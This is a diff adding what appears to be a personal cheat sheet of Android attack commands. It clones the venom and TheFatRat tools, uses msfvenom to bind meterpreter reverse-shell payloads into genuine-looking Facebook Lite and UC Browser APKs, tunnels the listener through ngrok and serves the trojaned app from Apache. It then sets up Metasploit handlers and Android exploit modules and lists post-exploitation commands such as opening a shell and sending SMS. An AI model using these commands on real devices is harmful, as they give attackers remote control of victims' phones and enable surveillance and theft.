@@ -1,0 +1,127 @@
+git clone https://github.com/r00t-3xp10it/venom.git
+
+2º - Set files execution permitions
+     `cd venom`
+chmod +x venom.sh
+ chmod +x setup.sh
+/setup.sh
+sudo ./venom.sh
+     `sudo chmod -R +x *.sh`
+     `sudo chmod -R +x *.py`
+
+3º - Install dependencies
+     `cd aux`
+     `sudo ./setup.sh`
+
+4º - Run main tool
+     `sudo ./venom.sh`
+
+
+msfvenom -x facebook-lite-191-0-0-7-122.apk -p android/meterpreter/reverse_tcp LHOST=10.30.176.2 LPORT=8080 -o Facebook_loded.apk
+
+------------------------------
+git clone https://github.com/Screetsec/TheFatRat.git
+cd TheFatRat
+chmod +x setup.sh && ./setup.sh
+
+Update
+
+cd TheFatRat
+./update && chmod +x setup.sh && ./setup.sh
+===========================================================
+./ngrok tcp 8080
+msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=10263 R > ./ngrok.apk
+service postgresql start
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST localhost
+set LPORT 8080
+exploit
+service apache2 start
+
+mv ngrok.apk /var/www/html/
+
+send_sms -d "775060037" -t "hello"
+==========================================
+msfvenom
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.3.218.3 LPORT=1234 R > ./mobileApp.apk
+mv mobileApp.apk /media/root/3939-6435/
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+show options
+set LHOST 10.4.194.3
+set LPORT 1234
+run
+help
+sysinfo             192.168.43.55
+shell
+whomi
+ip addr
+ping www.google.com
+sessions
+shell
+cd /var/www/html/ ls -l
+
+===============================
+set EXITONSESSION true
+show advanced
+====================================
+ use android/browser/webview_addjavascriptinterface
+
+set VERBOSE true
+set ReverseListenerBindAddress 10.2.160.3
+set ReverseListenerBindPort 4444
+=========================================================
+msfvenom -x com.uc.browser.en.apk -p android/meterpreter/reverse_tcp LHOST=10.2.160.3 LPORT=4444 -o com.uc.browser.en1.apk
+
+
+d2j -apk-sign com.uc.browser.en1.apk
+
+====================================
+
+set FILENAME e_book.pdf
+exploit
+
+msf > use exploit/android/fileformat/adobe_reader_pdf_js_interface
+msf exploit(adobe_reader_pdf_js_interface) > show targets
+    ...targets...
+msf exploit(adobe_reader_pdf_js_interface) > set TARGET < target-id >
+msf exploit(adobe_reader_pdf_js_interface) > show options
+    ...show and set options...
+msf exploit(adobe_reader_pdf_js_interface) > exploit
+
+
+
+=========================================
+
+msf > use exploit/android/adb/adb_server_exec
+msf exploit(adb_server_exec) > show targets
+    ...targets...
+msf exploit(adb_server_exec) > set TARGET < target-id >
+msf exploit(adb_server_exec) > show options
+    ...show and set options...
+msf exploit(adb_server_exec) > exploit
+
+
+set target 1
+set payload linux/x86/meterpreter/reverse_tcp
+============================
+msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 R > /root/apk/abcde.apk
+
+
+==================
+
+ set ExitOnSession false
+run -j
+sessions
+session -i 1
+
+===========================
+    app_install    Request to install apk file
+    app_list       List installed apps in the device
+    app_run        Start Main Activty for package name
+    app_uninstall  Request to uninstall application
+
+
